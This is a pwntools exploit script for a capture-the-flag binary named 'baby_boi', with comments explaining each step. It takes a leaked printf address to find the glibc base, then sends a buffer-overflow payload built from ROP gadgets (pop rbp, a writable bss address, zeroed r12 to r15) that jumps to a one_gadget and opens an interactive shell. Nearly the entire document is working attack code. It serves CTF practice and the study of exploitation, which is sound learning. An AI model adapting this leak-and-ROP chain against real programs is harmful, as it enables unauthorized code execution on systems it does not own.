from pwn import *
context.arch = 'amd64'

p = process('./baby_boi')

main_addr = 0x00400687 # the address of the main function (unused)
printf_glibc_offset = 0x000606f0 # the offset of printf in the glibc
pop_rdi_addr = 0x0000000000400793 # the address of pop rdi gadget

p.recvuntil('Here I am: ')
printf_leak = int(p.recv().strip(), 16) # gets the address leak of printf

one_gadget = 0xebce2 # the one gadget found using one_gadget
pop_r12_r13_r14_r15 = 0x000000000040078c # the poppers used for the one_gadget constraints
pop_rbp = 0x0000000000400608 # pop rbp used for the one_gadget constraint
bss_segment = 0x00601040 # the address of the bss segment, which is writable
null_arg = p64(0x0) # null argument used for zeroing out the registers

base_libc_addr = printf_leak - printf_glibc_offset # the base address of glibc used by taking the leak (full address) and subtracting by the offset (nibbles on end)

p.elf.libc.address = base_libc_addr # sets the address of p.elf.libc

libc = ELF(p.elf.libc.path) # constructs libc from p.elf.libc.path
libc.address = base_libc_addr # sets the address to the base address found by using found address (leak) - offset (from glibc lookup)

# taking this actual address and subtracting the offset, removes the nibbles on the end, giving us the base glibc address, since
# all glibc functionality comes from a root address, and only has offsets on the ends to separate them from other functionality

bin_sh_addr = next(libc.search(b'/bin/sh'))  # the address of /bin/sh (1st attempt, results in segfault)

system_addr = libc.sym['system'] # address of the system call (1st attempt, results in segfault)

one_gadget_addr = libc.address + one_gadget # address of the one gadget, which is the base address + the offset

#          32 + rbp    bss + 0x48 since rbp-0x48 must be w-able    empty out all r12-r15                                                    address of one_gadget
payload = cyclic(40) + p64(pop_rbp) + p64(bss_segment + 0x48) + p64(pop_r12_r13_r14_r15) + null_arg + null_arg + null_arg + null_arg + p64(one_gadget_addr)

p.sendline(payload)

p.interactive()